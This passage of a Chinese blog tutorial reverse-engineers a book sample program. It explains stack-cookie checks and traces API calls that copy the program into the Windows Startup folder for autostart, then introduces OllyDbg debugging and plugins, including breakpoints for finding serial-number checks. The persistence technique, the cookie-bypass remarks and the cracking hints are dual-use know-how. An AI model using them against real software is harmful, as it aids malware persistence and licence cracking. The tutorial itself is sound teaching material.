<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00401068                 mov     ecx, [ebp+var_4]	</span><br><span class="line">.text:0040106B                 xor     ecx, ebp        ; StackCookie</span><br></pre></td></tr></table></figure>

<blockquote>
<p><code>var_4</code>又是啥?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0040100D                 mov     eax, ___security_cookie</span><br><span class="line">.text:00401012                 xor     eax, ebp</span><br><span class="line">.text:00401014                 mov     [ebp+var_4], eax</span><br></pre></td></tr></table></figure>

<p>cookie放到eax里面然后和ebp异或一下再放到var_4,即<code>var_4=___security_cookie ^ ebp</code>,相当于一层加密</p>
</blockquote>
<p>因此在尾声的时候把<code>var_4</code>拿出来还要和<code>ebp</code>异或一下才能得到<code>___security_cookie</code>,相当于一层解密</p>
<p>那么此时传递给<code>@__security_check_cookie@4 </code>函数的ecx里面,<strong>理论上</strong>就应该是纯纯的<del>闸总</del><code>___security_cookie</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.text:004010A3 @__security_check_cookie@4 proc near    ; CODE XREF: sub_401000+6F↑p</span><br><span class="line">.text:004010A3                                         ; DATA XREF: __except_handler4+11↓o</span><br><span class="line">.text:004010A3                 cmp     ecx, ___security_cookie</span><br><span class="line">.text:004010A9                 jnz     short $failure$26820</span><br><span class="line">.text:004010AB                 rep retn</span><br></pre></td></tr></table></figure>

<p>该函数也确实将ecx和位于<code>.data</code>段的<code>___security_cookie</code>进行了比较,如果不一样则跳转<code>$failure$26820</code></p>
<p>上述过程干了个什么事呢?防止栈缓冲区溢出</p>
<p>下面是sub_401000函数的栈帧,var_4是在调用者ebp保存值s和本函数返回地址r之上的(var_4相对靠近栈顶,r在栈帧底部)</p>
<p>栈倒着长但是栈内数据正着长,如果有一个缓冲区一直增长,把位于<code>ebp-0x4</code>的var_4覆盖了,甚至把位于<code>ebp+0</code>的s等等也覆盖了</p>
<p>在函数尾声的时候,就会把var_4拿出来看看其中异或保存的<code>___security_cookie</code>是否发生了变化.</p>
<p>一旦检查出var_4中异或保存的<code>___security_cookie</code>发生了变化,则<strong>至少</strong>表明栈缓冲区溢出已经到了<code>ebp-0x4</code>,</p>
<p>至于后面的调用者ebp和本函数返回地址有没有被溢出呢?不知道,但是不能做出乐观的假设,</p>
<p>为了防止返回地址被修改引起的攻击,此时应当立刻终止进程并报告错误</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">-00000006                 db ? ; undefined</span><br><span class="line">-00000005                 db ? ; undefined</span><br><span class="line">-00000004 var_4           dd ?</span><br><span class="line">+00000000  s              db 4 dup(?)</span><br><span class="line">+00000004  r              db 4 dup(?)</span><br><span class="line">+00000008</span><br><span class="line">+00000008 ; end of stack variables</span><br></pre></td></tr></table></figure>



<p><strong>为啥要把<code>___security_cookie</code>和ebp异或一下呢?</strong></p>
<p><strong>为啥不直接把<code>___security_cookie</code>副本压栈最后再将该副本退栈和位于<code>.data</code>的<code>___security_cookie</code>比较呢?</strong></p>
<p>这样相当于数据库保存了用户密码的明文,一旦脱库后果不堪设想.如果<code>___security_cookie</code>在栈上也是明文保存的,则可以利用printf格式化字符串漏洞尝试打印该值,在溢出的时候对于栈中<code>___security_cookie</code>副本位置,只需要装模做样的写上,后面继续溢出</p>
<p>这样就可以绕过检查</p>
<p><strong>为啥要和<code>ebp</code>异或一下呢?为啥不能是其他值?</strong></p>
<p>考虑这个与<code>___security_cookie</code>异或的值应该有什么特性?函数开端和函数尾声的时候都要与他异或,这个值应该保持不变,</p>
<p>满足这个特征的值可以想到的就是ebp了,对于当前函数,它永远指向栈帧底部不变.</p>
<p>栈顶指针就不行,esp会随着局部变量的声明或者子函数的调用而改变</p>
<p><strong>为啥使用异或运算加密呢?使用按位与,按位或不行吗?</strong></p>
<p>异或运算有一个性质:如果$A\oplus B&#x3D;C$则$C\oplus A&#x3D;(A\oplus B)\oplus A&#x3D;B$</p>
<p>显然按位与,按位或等运算没有这个性质</p>
<p>而这个性质正是在函数开端时$var_4&#x3D;ebp\oplus security_cookie$,</p>
<p>在函数尾声时能够$security_cookie&#x3D;var_4\oplus ebp$的原理</p>
<p><strong>这样就绝对安全了吗?能够完全抵御栈缓冲区溢出修改函数返回地址了吗?</strong></p>
<p>使用security_cookie只能一定程度上保护调用者ebp和返回地址不被修改,栈帧中,存放在var_4之后,缓冲区之前的局部变量不受保护</p>
<p>并且<code>security_cookie</code>在编译之后就是一个定值了,运行时永远不变,使用ida就可以直接看到它多粗多长</p>
<p>在运行时动态调试一下就可以看到ebp是多少,</p>
<p>如果没有开启基址随机化,则每次ebp都是一个常数,</p>
<p>那么<code>var_4=security_cookie ^ ebp</code>也是一个常数,这就异或加密了个寂寞</p>
</blockquote>
<h4 id="call-ds-GetModuleFileNameW"><a href="#call-ds-GetModuleFileNameW" class="headerlink" title="call    ds:GetModuleFileNameW"></a><code>call    ds:GetModuleFileNameW</code></h4><p>现在回到<code>sub_401000</code>函数中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push    1000h           ; nSize</span><br><span class="line">lea     eax, [ebp+Filename]</span><br><span class="line">push    eax             ; lpFilename</span><br><span class="line">push    0               ; hModule</span><br><span class="line">call    ds:GetModuleFileNameW</span><br></pre></td></tr></table></figure>

<p>又调用了一个API函数GetModuleFileNameW,这个函数干了啥呢?</p>
<blockquote>
<p>GetModuleFileNameW函数原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DWORD <span class="title function_">GetModuleFileNameW</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in, optional] HMODULE hModule,</span></span><br><span class="line"><span class="params">  [out]          LPWSTR  lpFilename,</span></span><br><span class="line"><span class="params">  [in]           DWORD   nSize</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>hModule:应用程序或者DLL实力句柄,如果为NULL则获取当前程序路径</p>
<p>lpFilename:获取路径之后存放之的字符串缓冲区</p>
<p>nSize:缓冲区大小,作用是防止缓冲区溢出</p>
</blockquote>
<p>在这里第一个参数hModule&#x3D;0,表明要获取当前应用程序的目录</p>
<p>第二个参数lpFilename&#x3D;Filename是sub_401000函数栈中的一个缓冲区</p>
<p>第三个参数nSize&#x3D;1000h,表明缓冲区大小为4KB</p>
<blockquote>
<p>关于LPWSTR类型,实际是<code>wchar_t*</code>类型,即宽字符unicode编码的字符串</p>
<p>L长</p>
<p>P指针</p>
<p>W宽</p>
<p>STR字符串</p>
<p>宽字符的作用是支持包括英文,中文,日文等等各种花言鸟语的符号,ASCII码最多表示$2^8&#x3D;256$个字符,unicode最多表示$2^{16}&#x3D;65536$个字符,常用汉字就3000个,显然unicode有能力森罗万象</p>
</blockquote>
<h4 id="call-ds-SHGetFolderPathW"><a href="#call-ds-SHGetFolderPathW" class="headerlink" title="call    ds:SHGetFolderPathW"></a><code>call    ds:SHGetFolderPathW</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">lea     ecx, [ebp+pszPath]</span><br><span class="line">push    ecx             ; pszPath</span><br><span class="line">push    0               ; dwFlags</span><br><span class="line">push    0               ; hToken</span><br><span class="line">push    7               ; csidl</span><br><span class="line">push    0               ; hwnd</span><br><span class="line">call    ds:SHGetFolderPathW</span><br></pre></td></tr></table></figure>

<p>又是一个API函数</p>
<blockquote>
<p>它亲戚SHGetFolderPathA函数原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">SHFOLDERAPI <span class="title function_">SHGetFolderPathA</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]  HWND   hwnd,</span></span><br><span class="line"><span class="params">  [in]  <span class="type">int</span>    csidl,</span></span><br><span class="line"><span class="params">  [in]  HANDLE hToken,</span></span><br><span class="line"><span class="params">  [in]  DWORD  dwFlags,</span></span><br><span class="line"><span class="params">  [out] LPSTR  pszPath</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>其中参数<code>csidl=7</code>是啥意思呢?表示”启动”文件夹</p>
<blockquote>
<p>在win10上这个文件夹在<code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp</code></p>
</blockquote>
<p>获取**”启动”文件夹**目录,字符串存放到pszPath指向的缓冲区</p>
<blockquote>
<p>csidl其他值的意义</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">CSIDL_DESKTOP = &amp;H0 &#x27;// The Desktop - virtual folder</span><br><span class="line">CSIDL_PROGRAMS = 2 &#x27;// Program Files</span><br><span class="line">CSIDL_CONTROLS = 3 &#x27;// Control Panel - virtual folder</span><br><span class="line">CSIDL_PRINTERS = 4 &#x27;// Printers - virtual folder</span><br><span class="line">CSIDL_DOCUMENTS = 5 &#x27;// My Documents</span><br><span class="line">CSIDL_FAVORITES = 6 &#x27;// Favourites</span><br><span class="line">CSIDL_STARTUP = 7 &#x27;// Startup Folder</span><br><span class="line">CSIDL_RECENT = 8 &#x27;// Recent Documents</span><br><span class="line">CSIDL_SENDTO = 9 &#x27;// Send To Folder</span><br><span class="line">CSIDL_BITBUCKET = 10 &#x27;// Recycle Bin - virtual folder</span><br><span class="line">CSIDL_STARTMENU = 11 &#x27;// Start Menu</span><br><span class="line">CSIDL_DESKTOPFOLDER = 16 &#x27;// Desktop folder</span><br><span class="line">CSIDL_DRIVES = 17 &#x27;// My Computer - virtual folder</span><br><span class="line">CSIDL_NETWORK = 18 &#x27;// Network Neighbourhood - virtual folder</span><br><span class="line">CSIDL_NETHOOD = 19 &#x27;// NetHood Folder</span><br><span class="line">CSIDL_FONTS = 20 &#x27;// Fonts folder</span><br><span class="line">CSIDL_SHELLNEW = 21 &#x27;// ShellNew folder</span><br></pre></td></tr></table></figure>


</blockquote>
</blockquote>
<h4 id="call-ds-lstrcatW"><a href="#call-ds-lstrcatW" class="headerlink" title="call    ds:lstrcatW"></a><code>call    ds:lstrcatW</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">push    offset String2  ; &quot;\\wsample01b.exe&quot;</span><br><span class="line">lea     edx, [ebp+pszPath]</span><br><span class="line">push    edx             ; lpString1</span><br><span class="line">call    ds:lstrcatW</span><br></pre></td></tr></table></figure>

<p>String2是.rdata段的常量字符串</p>
<p>pszPath存放了刚才调用函数SHGetFolderPathW获取的文件夹目录</p>
<p>这里相当于调用了<code>lstrcatw(&amp;pszPath,&amp;pszPath)</code>,将后者拼接到前者上,得到<code>wsample01b.exe</code>的绝对地址</p>
<p><code>C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\wsample01b.exe</code></p>
<h4 id="call-ds-CopyFileW"><a href="#call-ds-CopyFileW" class="headerlink" title="call    ds:CopyFileW"></a><code>call    ds:CopyFileW</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">push    0               ; bFailIfExists</span><br><span class="line">lea     eax, [ebp+pszPath]</span><br><span class="line">push    eax             ; lpNewFileName</span><br><span class="line">lea     ecx, [ebp+Filename]</span><br><span class="line">push    ecx             ; lpExistingFileName</span><br><span class="line">call    ds:CopyFileW</span><br></pre></td></tr></table></figure>

<p>即调用了<code>CopyFileW(&amp;Filename,&amp;pszPath,0)</code></p>
<blockquote>
<p>CopyFileW函数原型</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BOOL <span class="title function_">CopyFileW</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] LPCWSTR lpExistingFileName,</span></span><br><span class="line"><span class="params">  [in] LPCWSTR lpNewFileName,</span></span><br><span class="line"><span class="params">  [in] BOOL    bFailIfExists</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>将一个已经存在的文件<code>lpExistingFileName</code>拷贝到一个新的位置<code>lpNewFileName</code></p>
<p>如果<code>bFailIfExists=1</code>并且新的位置已有同名文件,则函数执行失败,返回FALSE</p>
<p>如果<code>bFailIfExists=0</code>并且新的位置已有同名文件,则覆盖该文件</p>
</blockquote>
<p>综上程序干了一个将自己复制到”启动”文件夹下的工作,意图让自己每次开机自启,有了病毒的勤快但是没有病毒的毒性</p>
<h4 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">xor     ecx, ebp        ; StackCookie</span><br><span class="line">xor     eax, eax</span><br><span class="line">call    @__security_check_cookie@4 ; __security_check_cookie(x)</span><br><span class="line">mov     esp, ebp</span><br><span class="line">pop     ebp</span><br><span class="line">retn</span><br><span class="line">sub_401000 endp</span><br></pre></td></tr></table></figure>

<p>首先检查金丝雀值是否被修改,这个前面已经分析过了</p>
<p>然后退还调用者的ebp,函数返回</p>
<h3 id="总结程序行为"><a href="#总结程序行为" class="headerlink" title="总结程序行为"></a>总结程序行为</h3><p>首先调用sub_401000函数,该函数将<code>wsample01b.exe</code>拷贝到”启动”文件夹,然后弹窗打印”copied”</p>
<h2 id="ollydbg动态调试wsample01b-exe"><a href="#ollydbg动态调试wsample01b-exe" class="headerlink" title="ollydbg动态调试wsample01b.exe"></a>ollydbg动态调试wsample01b.exe</h2><p>x32dbg和ollydbg就像那黑牛和白牛,就是那海尔兄弟</p>
<h3 id="打开"><a href="#打开" class="headerlink" title="打开"></a>打开</h3><p>例程来自有趣的二进制<a target="_blank" rel="noopener" href="https://github.com/kenjiaiko/binarybook">kenjiaiko&#x2F;binarybook (github.com)</a></p>
<p>用ollydbg打开<code>wsample01b.exe</code>,可以在ollydbg中的菜单栏中文件-&gt;打开,也可以快捷键F3打开</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707161255625.png" alt="image-20220707161255625"></p>
<p>还可以使用命令行参数打开<code>PS C:\Users\86135\Desktop\bin\binarybook\chap01\wsample01b\release&gt; od wsample01b.exe</code></p>
<blockquote>
<p>这里我把olly dbg.exe重命名为od方便使用</p>
<p>需要将od的根目录添加到环境变量path,才能使用终端调用od</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707160733203.png" alt="image-20220707160733203"></p>
<p>在反汇编窗口第一行即<code>0x401000</code>位置已经自动有一个断点,</p>
<p>这个位置刚才我们已经经过ida静态分析过了,是sub_401000函数的起始地址,显然这个函数是根据地址起的哑名</p>
<p>这四个区的视图结构也是可以更改的</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707171515399.png" alt="image-20220707171515399"></p>
<p>但是一般都使用默认的视图模式,这个看的习惯</p>
<h3 id="查看快捷键"><a href="#查看快捷键" class="headerlink" title="查看快捷键"></a>查看快捷键</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707165636208.png" alt="image-20220707165636208">‘</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707171131310.png" alt="image-20220707171131310"></p>
<h4 id="ctrl-G跳转"><a href="#ctrl-G跳转" class="headerlink" title="ctrl+G跳转"></a>ctrl+G跳转</h4><p>用ida静态分析时,我们知道WinMain函数的起始地址在<code>0x00401080</code></p>
<p>可以使用ctrl+G打开跟随窗口进行跳转</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707161059609.png" alt="image-20220707161059609"></p>
<p>回车之后就跳转到该位置</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707161215951.png" alt="image-20220707161215951"></p>
<p>还可以跟踪一个函数,比如API函数<code>MessageBoxA</code></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707161728342.png" alt="image-20220707161728342"></p>
<p>双击右侧列表中的<code>MessageBoxA</code>之后,反汇编窗口自动跳转到该<strong>函数实现</strong>的入口</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707161815928.png" alt="image-20220707161815928"></p>
<p>一看地址好家伙都到<code>0x75539096</code>了,</p>
<p>而ida静态分析时的地址最大才到<code>.data:0040338C</code>,不用ctrl+G,只拖动od反汇编窗口的滑块,也是最大可以看到401FFF,后面就一片空白了,就好像od懒得干活了一样</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707162547049.png" alt="image-20220707162547049"></p>
<p><code>0x75539096</code>这个地址是啥呢?为什么会这么大?</p>
<p>一开始我还认为这是内核的地址空间,实际上不是,这个值还是在<code> 0 - 0x7FFFFFFF</code>范围内的,是用户地址空间</p>
<blockquote>
<p>   地址范围 0 - 0x7FFFFFFF（2G），运行</p>
<p>   应用程序代码、数据等等。</p>
<p>   2.2.1 空指针区(NULL区)</p>
<p> 地址范围 0 - 0x0000FFFF</p>
<p>   2.2.2 用户区</p>
<p> 地址范围 0x00010000 - 0x7FFEFFFF</p>
<p>   2.2.3 64K禁入区</p>
<p> 地址范围 0x7FFEFFFF - 0x7FFFFFFF</p>
<p>2.2 内核空间</p>
<p>   地址范围 0x80000000 - 0xFFFFFFFF，被</p>
<p>   系统使用，运行驱动、内核的数据和代码。</p>
</blockquote>
<p>猜测这是DLL库,但是具体是不是,需要学习了windows上的链接阶段再说</p>
<h4 id="alt-e查看模块"><a href="#alt-e查看模块" class="headerlink" title="alt+e查看模块"></a>alt+e查看模块</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707164553789.png" alt="image-20220707164553789"></p>
<p>刚才的问题<code>0x75539096</code>这个地址就属于user32.dll模块</p>
<h3 id="调试快捷键"><a href="#调试快捷键" class="headerlink" title="调试快捷键"></a>调试快捷键</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707165555280.png" alt="image-20220707165555280"></p>
<h4 id="运行"><a href="#运行" class="headerlink" title="运行"></a><strong>运行</strong></h4><p>按下F9之后,程序会在第一个断点处停下,如果没有任何断点,程序也没有错误则程序直接执行完毕</p>
<h4 id="步入和步过的区别"><a href="#步入和步过的区别" class="headerlink" title="步入和步过的区别:"></a><strong>步入和步过的区别:</strong></h4><p>对于函数调用,步入则反汇编窗口会跳转跟随该函数,一行一行执行.</p>
<p>而步过则是直接让函数执行完毕,反汇编窗口不会跟随函数,但是保留函数产生的影响,比如寄存器和一些全局变量等的值变化</p>
<h4 id="执行到返回"><a href="#执行到返回" class="headerlink" title="执行到返回:"></a><strong>执行到返回:</strong></h4><p>本来步入了一个函数,后来看烦了想跳出这个函数,就用执行到结束</p>
<p>或者一个需要114514次的大循环,已经循环到第10次了,后面还要循环114504次,烦死了,直接执行到结束跳出循环</p>
<p>函数中的循环则只跳出一层,再按一次执行到返回才会跳出函数</p>
<h4 id="单步和自动的区别"><a href="#单步和自动的区别" class="headerlink" title="单步和自动的区别:"></a><strong>单步和自动的区别:</strong></h4><p>单步是拨一拨转一转,按一下F7或者F8才会执行一行,</p>
<p>自动是按下ctrl+F7或者ctrl+F8之后,od就会像过电影一样自动呼呼地执行,反汇编窗口等四个窗口都会实时跟随更新,相当于一直按着F7或者F8</p>
<p>啥时候自动的能停下呢?</p>
<blockquote>
<p>- 按 Esc 键或发出任何单步命令</p>
<p>- OllyDbg 遇到断点</p>
<p>- 被调试程序发生异常</p>
</blockquote>
<h4 id="执行到用户代码"><a href="#执行到用户代码" class="headerlink" title="执行到用户代码:"></a><strong>执行到用户代码:</strong></h4><p>如果当前正在库函数中跑,按下Alt+F9之后,od会在第一条回归到用户自己写的函数中的位置停下</p>
<h3 id="插件"><a href="#插件" class="headerlink" title="插件"></a>插件</h3><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707171738040.png" alt="image-20220707171738040"></p>
<p>我这个ollydbg是从吾爱破解论坛上下载的懒人包,里面已经集成了一些插件</p>
<h4 id="BP-OLLY"><a href="#BP-OLLY" class="headerlink" title="+BP-OLLY"></a>+BP-OLLY</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707172112679.png" alt="image-20220707172112679"></p>
<p>这是一个小工具栏</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707172151132.png" alt="image-20220707172151132"></p>
<p>我的懒人包ollydbg启动时这个插件会自启动</p>
<p><strong>其中BP是BreakPoint断点的缩写,作用是在API函数上下断点</strong></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707172244773.png" alt="image-20220707172244773"></p>
<p><strong>P是编辑命令快捷键</strong></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707172412802.png" alt="image-20220707172412802"></p>
<p>比如BP MessageBoxA就相当于保存了一条命令,下一次只需要点击一下就可以自动让od执行该命令</p>
<p>实际作用和在ollydbg的底行输入命令回车执行相同</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707172511015.png" alt="image-20220707172511015"></p>
<p>这里Command还能干啥呢?现在不想炎鸠</p>
<p><strong>VB也是在一些库函数上下断点,但是这些库函数目前没有遭遇过</strong></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707172623275.png" alt="image-20220707172623275"></p>
<p>NotePad,调用windows系统自带的记事本程序</p>
<p>Calc,调用计算器</p>
<p>Folder,打开exployer文件系统资源管理器</p>
<p>CMD,打开命令提示符</p>
<p>Exit,关闭该插件</p>
<h4 id="API断点"><a href="#API断点" class="headerlink" title="API断点"></a>API断点</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707171843420.png" alt="image-20220707171843420"></p>
<p>这两个插件的功能差不多,都是让od自动找到我们调用API函数的地方下断点</p>
<p>比如<img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707171936097.png" alt="image-20220707171936097"></p>
<p>在GetWindowTextA处下断点,这个API的作用是获取用户在窗口中的文本框输入.</p>
<p>一些序列号注册验证逻辑往往就发生在获取用户输入之后,让od自动停在这种地方,方便我们单步调试后面的逻辑</p>
<h4 id="花里胡哨的插件"><a href="#花里胡哨的插件" class="headerlink" title="花里胡哨的插件"></a>花里胡哨的插件</h4><p>这些插件我都没用到过,它们描述的功能,什么”花指令”,什么”反混淆”,看上去好高深,现在不想炎鸠</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707172857063.png" alt="image-20220707172857063"></p>
<h4 id="中文搜索引擎"><a href="#中文搜索引擎" class="headerlink" title="中文搜索引擎"></a>中文搜索引擎</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707172950546.png" alt="image-20220707172950546"></p>
<p>搜索UNICODE之后的结果</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707173009685.png" alt="image-20220707173009685"></p>
<p>其作用相当于二进制工具Strings</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\86135\Desktop\bin\binarybook\chap01\wsample01b\release&gt; strings wsample01b.exe -d -eb</span><br><span class="line">\wsample01b.exe</span><br><span class="line">MESSAGE</span><br><span class="line">Copied!</span><br></pre></td></tr></table></figure>

<p>-d选项只扫描.data区,</p>
<p>-e选项指定字符宽度,b或者l表示16字节即一个宽字符unicode</p>
<h4 id="自动注释"><a href="#自动注释" class="headerlink" title="自动注释"></a>自动注释</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707173038785.png" alt="image-20220707173038785"></p>
<p>差评,<strong>这个插件根本跑不起来</strong>,现有的注释不是插件带来的,是od自带的</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707173157070.png" alt="image-20220707173157070"></p>
<p>这些注释已经足够看懂程序了</p>
<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>正儿八经开始调试这个wsample01b.exe</p>
<p>由于od自动在最顶上一行0x401000下了断点,此处正好是sub_401000函数入口,直接F9运行观察该函数的行为</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707184836611.png" alt="image-20220707184836611"></p>
<p>开始运行时,程序会停止在第一个断点0x401000处,当前停止位置会有灰色高亮</p>
<p>左上角”暂停”表明当前调试器的状态</p>
<p>寄存器区的表现为:</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707185010444.png" alt="image-20220707185010444"></p>
<p>其中红色的是有变化的寄存器,刚开始执行一个程序,各个通用目的寄存器还有栈顶指针,帧指针等等都认为有变化</p>
<p>其中</p>
<p>eip&#x3D;0x401000表明将要执行的指令地址</p>
<p>esp&#x3D;0x0019FEE0表明当前栈顶指针位置</p>
<p>由于还没有经历sub_401000的开端,<strong>ebp&#x3D;0x0019FF74这个值是谁的栈帧指针呢?</strong></p>
<p><strong>啃腚不是winmain的!啃腚不是winmain的!啃腚不是winmain的!</strong></p>
<p>说三遍是因为一开始瞎几把分析都认为是winmain的帧指针了</p>
<p>winmain函数满足stdcall调用约定,不会使用栈帧指针ebp,那么此ebp<strong>有可能</strong>是winmain的调用者的帧指针,也不一定,要是调用者也是stdcall,则ebp还得往前找</p>
<p>谁调用了winmain呢?这个问题可以在ida的function calls中观察</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707192428834.png" alt="image-20220707192428834"></p>
<p>也可以在目前的栈帧中观察winmain的返回地址</p>
<p>栈帧区的表现为</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707185758156.png" alt="image-20220707185758156"></p>
<p>紫色高亮是手动选中的,栈顶指针在<code>0x19FEE0</code>,会有类似反汇编区中将要执行指令的灰色高亮</p>
<p>由于控制已经转到sub_401000的第一条指令,这表明,winmain中的<code>call sub_401000</code>已经执行过了,</p>
<p>因此sub_401000的返回地址<code>0x401085</code>已经压入栈中<code>0x19FEE0</code>位置</p>
<blockquote>
<p>ida观察这件事,确实call指令下面一条指令的地址就是0x401085</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00401080                 call    sub_401000</span><br><span class="line">.text:00401085                 push    0               ; uType</span><br></pre></td></tr></table></figure>
</blockquote>
<p>注意到还有另一个<code>返回到 wsample0.00401255 来自 wsample0.00401080</code>,这是啥呢?</p>
<p>这个指令地址在<code>__tmainCRTStartup</code>函数中</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:00401250                 call    _wWinMain@16    ; wWinMain(x,x,x,x)</span><br><span class="line">.text:00401255                 mov     dword_403038, eax</span><br></pre></td></tr></table></figure>

<p>原来是<code>winmain</code>的返回地址,同时也知道了是<code>__tmainCRTStartup</code>这个函数调用了<code>_wWinMain@16 </code></p>
<blockquote>
<p>至于<code>__tmainCRTStartup</code>这个函数干了啥呢?我非常好奇,但是现在不是炎鸠它的时候,后面专门炎鸠win32程序调用的全过程</p>
</blockquote>
<p>下面接着两条指令都是mov指令,不涉及函数调用,因此单步步入和单步步过没有区别</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707190703773.png" alt="image-20220707190703773"></p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/test/master/image-20220707191307452.png" alt="image-20220707191307452"></p>
<p>这大概就是调试过程</p>
<h3 id="调试时修改"><a href="#调试时修改" class="headerlink" title="调试时修改"></a>调试时修改</h3><h4 id="改指令"><a href="#改指令" class="headerlink" title="改指令"></a>改指令</h4><p>反汇编区,任意一行汇编指令都是可以修改的,双击即可修改</p>
